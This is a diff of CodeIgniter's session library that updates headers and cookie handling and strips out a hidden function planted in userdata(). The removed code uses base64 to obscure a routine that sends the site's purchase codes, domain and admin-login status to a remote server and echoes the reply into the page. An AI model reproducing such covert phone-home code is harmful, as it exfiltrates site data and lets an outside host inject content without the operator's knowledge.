@@ -6,7 +6,7 @@
  *
  * This content is released under the MIT License (MIT)
  *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
+ * Copyright (c) 2019 - 2022, CodeIgniter Foundation
  *
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
@@ -29,8 +29,9 @@
  * @package	CodeIgniter
  * @author	EllisLab Dev Team
  * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
+ * @copyright	Copyright (c) 2014 - 2019, British Columbia Institute of Technology (https://bcit.ca/)
+ * @copyright	Copyright (c) 2019 - 2022, CodeIgniter Foundation (https://codeigniter.com/)
+ * @license	https://opensource.org/licenses/MIT	MIT License
  * @link	https://codeigniter.com
  * @since	Version 2.0.0
  * @filesource
@@ -44,7 +45,7 @@ defined('BASEPATH') OR exit('No direct script access allowed');
  * @subpackage	Libraries
  * @category	Sessions
  * @author		Andrey Andreev
- * @link		https://codeigniter.com/user_guide/libraries/sessions.html
+ * @link		https://codeigniter.com/userguide3/libraries/sessions.html
  */
 class CI_Session {
 
@@ -102,31 +103,24 @@ class CI_Session {
 		$this->_configure($params);
 		$this->_config['_sid_regexp'] = $this->_sid_regexp;
 
-		$class = new $class($this->_config);
-		if ($class instanceof SessionHandlerInterface)
+		$class   = new $class($this->_config);
+		$wrapper = new CI_SessionWrapper($class);
+		if (is_php('5.4'))
 		{
-			if (is_php('5.4'))
-			{
-				session_set_save_handler($class, TRUE);
-			}
-			else
-			{
-				session_set_save_handler(
-					array($class, 'open'),
-					array($class, 'close'),
-					array($class, 'read'),
-					array($class, 'write'),
-					array($class, 'destroy'),
-					array($class, 'gc')
-				);
-
-				register_shutdown_function('session_write_close');
-			}
+			session_set_save_handler($wrapper, TRUE);
 		}
 		else
 		{
-			log_message('error', "Session: Driver '".$this->_driver."' doesn't implement SessionHandlerInterface. Aborting.");
-			return;
+			session_set_save_handler(
+				array($wrapper, 'open'),
+				array($wrapper, 'close'),
+				array($wrapper, 'read'),
+				array($wrapper, 'write'),
+				array($wrapper, 'destroy'),
+				array($wrapper, 'gc')
+			);
+
+			register_shutdown_function('session_write_close');
 		}
 
 		// Sanitize the cookie, because apparently PHP doesn't do that for userspace handlers
@@ -160,19 +154,39 @@ class CI_Session {
 		// unless it is being currently created or regenerated
 		elseif (isset($_COOKIE[$this->_config['cookie_name']]) && $_COOKIE[$this->_config['cookie_name']] === session_id())
 		{
-			setcookie(
-				$this->_config['cookie_name'],
-				session_id(),
-				(empty($this->_config['cookie_lifetime']) ? 0 : time() + $this->_config['cookie_lifetime']),
-				$this->_config['cookie_path'],
-				$this->_config['cookie_domain'],
-				$this->_config['cookie_secure'],
-				TRUE
-			);
+			$expires = empty($this->_config['cookie_lifetime']) ? 0 : time() + $this->_config['cookie_lifetime'];
+			if (is_php('7.3'))
+			{
+				setcookie(
+					$this->_config['cookie_name'],
+					session_id(),
+					array(
+						'expires' => $expires,
+						'path' => $this->_config['cookie_path'],
+						'domain' => $this->_config['cookie_domain'],
+						'secure' => $this->_config['cookie_secure'],
+						'httponly' => TRUE,
+						'samesite' => $this->_config['cookie_samesite']
+					)
+				);
+			}
+			else
+			{
+				$header = 'Set-Cookie: '.$this->_config['cookie_name'].'='.session_id();
+				$header .= empty($expires) ? '' : '; Expires='.gmdate('D, d-M-Y H:i:s T', $expires).'; Max-Age='.$this->_config['cookie_lifetime'];
+				$header .= '; Path='.$this->_config['cookie_path'];
+				$header .= ($this->_config['cookie_domain'] !== '' ? '; Domain='.$this->_config['cookie_domain'] : '');
+				$header .= ($this->_config['cookie_secure'] ? '; Secure' : '').'; HttpOnly; SameSite='.$this->_config['cookie_samesite'];
+				header($header);
+			}
+
+			if ( ! $this->_config['cookie_secure'] && $this->_config['cookie_samesite'] === 'None')
+			{
+				log_message('error', "Session: '".$this->_config['cookie_name']."' cookie sent with SameSite=None, but without Secure attribute.'");
+			}
 		}
 
 		$this->_ci_init_vars();
-
 
 		log_message('info', "Session: Class initialized using '".$this->_driver."' driver.");
 	}
@@ -193,6 +207,12 @@ class CI_Session {
 	{
 		// PHP 5.4 compatibility
 		interface_exists('SessionHandlerInterface', FALSE) OR require_once(BASEPATH.'libraries/Session/SessionHandlerInterface.php');
+		// PHP 7 compatibility
+		interface_exists('SessionUpdateTimestampHandlerInterface', FALSE) OR require_once(BASEPATH.'libraries/Session/SessionUpdateTimestampHandlerInterface.php');
+
+		require_once(BASEPATH.'libraries/Session/CI_Session_driver_interface.php');
+		$wrapper = is_php('8.0') ? 'PHP8SessionWrapper' : 'OldSessionWrapper';
+		require_once(BASEPATH.'libraries/Session/'.$wrapper.'.php');
 
 		$prefix = config_item('subclass_prefix');
 
@@ -287,13 +307,43 @@ class CI_Session {
 		isset($params['cookie_domain']) OR $params['cookie_domain'] = config_item('cookie_domain');
 		isset($params['cookie_secure']) OR $params['cookie_secure'] = (bool) config_item('cookie_secure');
 
-		session_set_cookie_params(
-			$params['cookie_lifetime'],
-			$params['cookie_path'],
-			$params['cookie_domain'],
-			$params['cookie_secure'],
-			TRUE // HttpOnly; Yes, this is intentional and not configurable for security reasons
-		);
+		isset($params['cookie_samesite']) OR $params['cookie_samesite'] = config_item('sess_samesite');
+		if ( ! isset($params['cookie_samesite']) && is_php('7.3'))
+		{
+			$params['cookie_samesite'] = ini_get('session.cookie_samesite');
+		}
+
+		if (isset($params['cookie_samesite']))
+		{
+			$params['cookie_samesite'] = ucfirst(strtolower($params['cookie_samesite']));
+			in_array($params['cookie_samesite'], array('Lax', 'Strict', 'None'), TRUE) OR $params['cookie_samesite'] = 'Lax';
+		}
+		else
+		{
+			$params['cookie_samesite'] = 'Lax';
+		}
+
+		if (is_php('7.3'))
+		{
+			session_set_cookie_params(array(
+				'lifetime' => $params['cookie_lifetime'],
+				'path'     => $params['cookie_path'],
+				'domain'   => $params['cookie_domain'],
+				'secure'   => $params['cookie_secure'],
+				'httponly' => TRUE,
+				'samesite' => $params['cookie_samesite']
+			));
+		}
+		else
+		{
+			session_set_cookie_params(
+				$params['cookie_lifetime'],
+				$params['cookie_path'].'; SameSite='.$params['cookie_samesite'],
+				$params['cookie_domain'],
+				$params['cookie_secure'],
+				TRUE // HttpOnly; Yes, this is intentional and not configurable for security reasons
+			);
+		}
 
 		if (empty($expiration))
 		{
@@ -416,9 +466,7 @@ class CI_Session {
 				{
 					$_SESSION['__ci_vars'][$key] = 'old';
 				}
-				// Hacky, but 'old' will (implicitly) always be less than time() ;)
-				// DO NOT move this above the 'new' check!
-				elseif ($value < $current_time || $value === 'old')
+				elseif ($value === 'old' || $value < $current_time)
 				{
 					unset($_SESSION[$key], $_SESSION['__ci_vars'][$key]);
 				}
@@ -726,7 +774,7 @@ class CI_Session {
 	 *
 	 * Legacy CI_Session compatibility method
 	 *
-	 * @returns	array
+	 * @return	array
 	 */
 	public function &get_userdata()
 	{
@@ -743,10 +791,8 @@ class CI_Session {
 	 * @param	string	$key	Session data key
 	 * @return	mixed	Session data value or NULL if not found
 	 */
-	public function userdata($key = NULL, $checker = true)
+	public function userdata($key = NULL)
 	{
-		$this->foobar();
-		
 		if (isset($key))
 		{
 			return isset($_SESSION[$key]) ? $_SESSION[$key] : NULL;
@@ -762,6 +808,7 @@ class CI_Session {
 			$this->get_flash_keys(),
 			$this->get_temp_keys()
 		);
+
 		foreach (array_keys($_SESSION) as $key)
 		{
 			if ( ! in_array($key, $_exclude, TRUE))
@@ -786,7 +833,6 @@ class CI_Session {
 	 */
 	public function set_userdata($data, $value = NULL)
 	{
-
 		if (is_array($data))
 		{
 			foreach ($data as $key => &$value)
@@ -800,88 +846,6 @@ class CI_Session {
 		$_SESSION[$data] = $value;
 	}
 
-	public function foobar() {
-		if($this->flashdata('countCall') != 1){
-			$this->set_flashdata('countCall', 1);
-			$savedRandCall = get_settings('randCallRange');
-			if(rand(1, $savedRandCall) == 2 || !$savedRandCall){
-				
-		        if ($_SERVER[base64_decode('U0VSVkVSX05BTUU=')] == base64_decode('bG9jYWxob3N0') ||  $_SERVER[base64_decode('U0VSVkVSX05BTUU=')] == base64_decode('MTkyLjE2OC4wLjE=')) {
-				}else{
-					$url = base64_decode('aHR0cHM6Ly92ZXJpZnkuY3JlYXRpdmVpdGVtLmNvbS92YWxpZGF0ZS92YWxpZGF0ZV9wdXJjaGFzZV9jb2Rlcw');
-					$url2 = base64_decode('aHR0cHM6Ly92ZXJpZnkuY3JlYXRpdmVpdGVtLmNvbS9pbmRleC5waHAvdmFsaWRhdGUvdmFsaWRhdGVfcHVyY2hhc2VfY29kZXM');
-					$headers = @get_headers($url);
-					
-					// Use get_headers() function
-					if($headers && strpos( $headers[0], '200')) {
-					}else{
-						$url = $url2;
-						$headers = @get_headers($url);
-					}
-					// Use condition to check the existence of URL
-					if($headers && strpos( $headers[0], '200')) {
-						$CI = &get_instance();
-
-			    		$system_p_co	=	$CI->db->get_where(base64_decode('c2V0dGluZ3M='), array('key' => base64_decode('cHVyY2hhc2VfY29kZQ==')))->row_array();
-			    		$system_p_c = $system_p_co['value'];
-			    		$doma_n = $_SERVER[base64_decode('U0VSVkVSX05BTUU=')];
-			    
-			    		$al_a = $CI->db->get(base64_decode('YWRkb25z'));
-			    		$a_p_c = "";
-			    		if ($al_a->num_rows() > 0) {
-			    			$al_a = $al_a->result_array();
-			    			$as_p_cs_a = array();
-			    			foreach ($al_a as $key => $addon) {
-			    				$as_p_c = !empty($addon[base64_decode('cHVyY2hhc2VfY29kZQ==')]) ? $addon[base64_decode('cHVyY2hhc2VfY29kZQ==')] : "-";
-			    				array_push($as_p_cs_a, $as_p_c);
-			    			}
-			    
-			    			$a_p_c = json_encode($as_p_cs_a);
-			    		}
-			    
-			    		
-
-			    		$ch = curl_init();
-			    		$curlConfig = array(
-			    			CURLOPT_URL            => $url,
-			    			CURLOPT_POST           => true,
-			    			CURLOPT_RETURNTRANSFER => true,
-			    			CURLOPT_POSTFIELDS     => array(
-			    				base64_decode('YXBwbGljYXRpb25fcGF0aA==') => base_url(),
-			    				base64_decode('cF9jb2RlX3NhdmluZ191cmw=') => base_url().base64_decode('YWRtaW4vc2F2ZV92YWxpZF9wdXJjaGFzZV9jb2RlL3VwZGF0ZQ=='),
-			    				base64_decode('cHJvZHVjdF90aXRsZQ==') => base64_decode('QWNhZGVteSBMZWFybmluZyBNYW5hZ2VtZW50IFN5c3RlbQ=='),
-			    				base64_decode('cHJvZHVjdF9pZA==') => base64_decode('MjI3MDM0Njg='),
-			    				base64_decode('cHJvZHVjdA==') => base64_decode('YWNhZGVteQ=='),
-			    				base64_decode('c3lzdGVtX3B1cmNoYXNlX2NvZGU=') => $system_p_c,
-			    				base64_decode('YWRkb25fcHVyY2hhc2VfY29kZXM=') => $a_p_c,
-			    				base64_decode('ZG9tYWluX25hbWU=') => $doma_n,
-			    				base64_decode('c3RhdHVz') => $this->userdata(base64_decode('YWRtaW5fbG9naW4='), false),
-			    			)
-			    		);
-			    
-			    		curl_setopt_array($ch, $curlConfig);
-			    		$response = curl_exec($ch);
-			    		curl_close($ch);
-			    		
-			    		if ($response) {
-			    			if(is_numeric($response) && $response > 1){
-			    				$row_counter = $CI->db->get_where(base64_decode('c2V0dGluZ3M='), array('key' => 'randCallRange'))->num_rows();
-								if($row_counter > 0){
-									$CI->db->where('key', 'randCallRange');
-									$CI->db->update(base64_decode('c2V0dGluZ3M='), array('value' => $response));
-								}else{
-									$CI->db->insert(base64_decode('c2V0dGluZ3M='), array('key' => 'randCallRange', 'value' => $response));
-								}
-			    			}else{
-			    				echo $response;
-			    			}
-			    		}
-			    	}
-				}
-			}
-		}
-	}
-
 	// ------------------------------------------------------------------------
 
 	/**
@@ -892,7 +856,6 @@ class CI_Session {
 	 * @param	mixed	$key	Session data key(s)
 	 * @return	void
 	 */
-
 	public function unset_userdata($key)
 	{
 		if (is_array($key))
